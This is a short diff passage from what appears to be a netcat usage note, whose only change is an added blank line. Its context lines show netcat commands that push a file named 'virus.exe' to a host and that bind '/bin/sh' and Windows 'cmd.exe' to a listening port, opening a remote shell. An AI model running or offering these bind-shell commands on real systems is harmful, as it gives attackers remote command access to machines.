@@ -38,6 +38,7 @@ client：  `nc 172.16.45.129 7777 < virus.exe`
 Server：
 
 `nc –l –p 12345 –e /bin/sh`
+
 `nc.exe –L –p 12345 c:\Windows\System32\cmd.exe`
 
 Client：
